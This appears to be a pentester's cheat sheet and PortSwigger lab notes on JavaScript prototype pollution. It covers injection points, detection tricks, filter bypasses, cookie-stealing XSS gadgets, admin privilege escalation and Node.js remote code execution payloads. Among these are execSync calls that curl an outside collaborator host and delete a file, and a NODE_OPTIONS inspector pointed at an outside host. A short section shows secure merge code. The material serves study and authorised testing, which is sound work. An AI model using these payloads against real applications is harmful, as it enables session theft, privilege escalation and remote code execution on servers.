tactic: Multiple

**Prototype Pollution** is when an attacker injects properties into JavaScript's `Object.prototype` (or other base prototypes), affecting every object in the application that inherits from that prototype. Since almost all JS objects inherit from `Object.prototype`, a single injection poisons the entire application's object graph.
this usually exploited when the app handles an attacker controlled property in an unsafe way

```
// Every JS object inherits from Object.prototype
const user = {};
user.toString(); // works — inherited from Object.prototype

// If an attacker pollutes Object.prototype:
Object.prototype.isAdmin = true;

// Now every object in the app has isAdmin = true
const newUser = {};
console.log(newUser.isAdmin); // true — even though it was never set
```

Pollution happens through unsafe recursive merge operations that treat `__proto__` as a regular key:

```javascript
// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]; // key = "__proto__" poisons the prototype
    }
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```

---

## Three Things You Need

```
1. Prototype source    → input point where you can inject __proto__
2. Sink               → JS function or DOM element that uses the polluted property
3. Gadget             → the property that bridges source to sink and causes harm
```

---

## Injection Points

- URL query parameters: `?__proto__[x]=y`
- JSON request bodies: `{"__proto__": {"x": "y"}}`
- URL hash/fragment: `#__proto__[x]=y`
- `POST`/`PUT` body parameters in APIs
- WebSocket messages
- `localStorage`, `cookie` values parsed as JSON
- Third-party library configuration objects
- Constructor-based alternative when `__proto__` is filtered: `{"constructor":{"prototype":{"x":"y"}}}`

---

## Checklist

### Client-Side Detection

- [ ]  Inject via URL parameter and check if the property appears on a fresh object:

```
	https://target.com/?__proto__[testprop]=polluted
```

```
Open console and run: `({}).testprop` — if it returns `polluted` → vulnerable
```

- [ ]  Inject via URL hash (used by some routing libraries):

```
	https://target.com/#__proto__[testprop]=polluted
```

- [ ]  Use DOM Invader in Burp to automatically scan for prototype pollution sources and gadgets
- [ ]  Look for reflected properties in the DOM that match what you injected

### Server-Side Detection

- [ ]  Inject a visible property change via JSON body in `POST`/`PUT` requests:

```json
	{"username":"wiener","__proto__":{"json spaces":10}}
```

```
If the response JSON is suddenly formatted with 10 spaces → pollution confirmed
```

- [ ]  Status code override — inject a status property and observe the response code:

```json
	{"__proto__":{"status":555}}
```

```
If the server returns 555 instead of 400/200 → confirmed (useful for blind detection)
```

- [ ]  Charset override detection:

```json
	{"__proto__":{"content-type":"application/json; charset=utf-7"}}
```

- [ ]  Send to Burp's Server-Side Prototype Pollution Scanner extension to automate detection

### Bypassing `__proto__` Filters

- [ ]  Use constructor-based pollution when `__proto__` keyword is sanitized:

```json
	{"constructor":{"prototype":{"isAdmin":true}}}
```

- [ ]  Use nested obfuscation when only partial sanitization is applied:

```
	?__pro__proto__to__[transport_url]=data%3A%2Calert%281%29
```

```
The sanitizer strips `__proto__` once, leaving `__proto__` behind
```

---

## Client-Side Attacks

### XSS via Prototype Pollution Gadget

```
https://target.com/#__proto__[hitCallback]=alert(document.cookie)
```

Many chat widgets and analytics libraries check for a `hitCallback` property — if you pollute it with a function string it gets executed.

```html
<script>
    location = "https://target.com/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```

### transport_url Gadget (script src injection)

```
?__proto__[transport_url]=data:,alert(1)
```

Some libraries use `transport_url` to dynamically load scripts — polluting it injects an attacker-controlled script source.

### innerHTML / eval Gadgets

```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[template]=<script>alert(1)</script>
```

### Third-Party Library Gadgets

Common properties worth trying across popular libraries:

```
__proto__[hitCallback]       jQuery / analytics
__proto__[transport_url]     socket.io
__proto__[escapeMarkup]      Handlebars
__proto__[compile]           Lodash template
__proto__[sourceURL]         various bundlers
__proto__[sequence]          jQuery
```

---

## Server-Side Attacks

> Important: unlike client-side, server-side pollution persists until the process restarts — you cannot just refresh. Be careful in production targets, always pollute with reversible properties first.

### Privilege Escalation

json

```json
POST /my-account/change-address
{
    "country": "UK",
    "__proto__": {
        "isAdmin": true
    }
}
```

### Constructor Alternative

json

```json
{
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
}
```

### RCE via execArgv (Node.js child_process)

When the server spawns child processes and uses inherited prototype properties as arguments, you can inject `--eval` to execute arbitrary JavaScript in the child process:

json

```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://OASTIFY.com')"
        ]
    }
}
```

Execute arbitrary commands:

json

```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
        ]
    }
}
```

Trigger by calling an admin endpoint that runs a maintenance job or spawns a child process.

### RCE via shell and env (alternative Node.js vector)

json

```json
{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect=OASTIFY.com:4444"
    }
}
```

### RCE via env injection

json

```json
{
    "__proto__": {
        "env": {
            "EVIL": "require('child_process').execSync('id')//"
        },
        "NODE_OPTIONS": "--require /proc/self/environ"
    }
}
```

### Blind Detection Without Reflection

When no properties are reflected back, use status code override to confirm:

json

```json
{"__proto__": {"status": 555}}
```

If the server returns 555 → blind server-side pollution confirmed.

---

## White Box Testing

**Vulnerable, unsafe recursive merge assigns `__proto__` as a key:**

java

```java
// Node.js / JavaScript backend — insecure merge utility
function merge(target, source) {
    for (let key of Object.keys(source)) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            merge(target[key], source[key]); // recurses into __proto__
        } else {
            target[key] = source[key]; // assigns directly to Object.prototype
        }
    }
}

app.post('/settings', (req, res) => {
    const settings = {};
    merge(settings, req.body); // req.body contains {"__proto__":{"isAdmin":true}}
});
```

**Vulnerable in Java context, Jackson deserializing into a Map without type restriction:**

java

```java
@PostMapping("/api/settings")
public ResponseEntity<?> updateSettings(@RequestBody Map<String, Object> body) {
    // if this Map is passed to a JS engine (Nashorn/GraalVM) or Node.js subprocess
    // the __proto__ key may propagate into prototype pollution territory
    scriptEngine.eval("applySettings(" + objectMapper.writeValueAsString(body) + ")");
    return ResponseEntity.ok().build();
}
```

**Secure (Node.js backend):**

javascript

```javascript
// Option 1 — use Object.create(null) for merge targets (no prototype to pollute)
const settings = Object.create(null);

// Option 2 — sanitize keys before merge
function safeMerge(target, source) {
    for (let key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue; // block known pollution vectors
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = target[key] || {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Option 3 — use structuredClone() (Node 17+) or JSON parse/stringify to deep clone safely
const safe = JSON.parse(JSON.stringify(userInput));

// Option 4 — freeze Object.prototype to prevent any pollution
Object.freeze(Object.prototype);
```

---

# Labs

 **Polluting via URL**

``https://vulnerable-website.com/?__proto__[evilProperty]=payload``


``{ existingProperty1: 'foo', existingProperty2: 'bar', __proto__: { evilProperty: 'payload' } }``


at some point the recursive operation may assign the value of evilProperty using this statement

``targetObject.__proto__.evilProperty = 'payload';``


```In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.```

 **pollution via JSON input**

```json 
`{ "__proto__": { "evilProperty": "payload" } }`
```

json-parse()  treats any key in the json object as arbitrary string like proto its c

``const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');``


**Prototype pollution sinks**

js function or DOM element that are able to access proto polution which inable us to execute js or system commands 


- prototype gadget means that when we turn a prototype pollutionn vuln into an actual exploit 
- example of gadget  in he library code check whether the dev has added certain protperites to the object if a propery represents a particular option  that is not present 


 **Detecting server-side prototype pollution**

try  injecting properties that match potential configuration  and then compare the severs behaviour before and after  try something simple like `- [Status code override](https://portswigger.net/web-security/prototype-pollution/server-side#status-code-override)
- JSON spaces override, Charset override,charset-override`

**Privilege escalation via server-side prototype pollution**
`POST /my-account/change-address `
```
"country":"UK","sessionId":"WWpOOK65WHVhdK7kOW3nAdPtRwfeDLGN",
  "__proto__":{
        "isAdmin":"True"
    }
```
    
**Client-side prototype pollution in third-party libraries**

`<script> location="https://lab.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>`

 **Bypassing flawed key sanitization**

`?__pro__proto__to__[transport_url]=data%3A%2Calert%281%29`


**Client-side prototype pollution in third-party libraries**

`chat#__proto__[hitCallback]=alert%281%29`

not solved but triggered

 **Detecting server-side prototype pollution without polluted property reflection**
idea is that data is not reflected so its blind hence trigger some status error and check its behaviour like this when it works  should return a status 555 rather thatn 400

`"__proto__": {"status":555}`



**Bypassing flawed input filters for server-side prototype pollution**


sometime the server santize the keyword of __proto__ we can bypass this by usingn the constructor method

`"constructor":{"prototype":{"isAdmin": true}}`


 **Remote code execution via server-side prototype pollution**

- call the collab first

create a child process then execute a command  `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process
in the change address then when executing the admin  run maintenance job it works 

``"__proto__": {"execArgv":["--eval=require('child_process').execSync('curl https://ke28n8t7cxh5nrjkmo48g1gjqaw1kv8k.oastify.com')"]}``

we can execute any command 

``"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }``


## Resources

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [NetSPI Ultimate Guide to Prototype Pollution](https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/)
- [HackTricks Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [Gareth Heyes Prototype Pollution Research](https://portswigger.net/research/server-side-prototype-pollution)
- [DOM Invader Prototype Pollution Scanner](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution)
- https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/
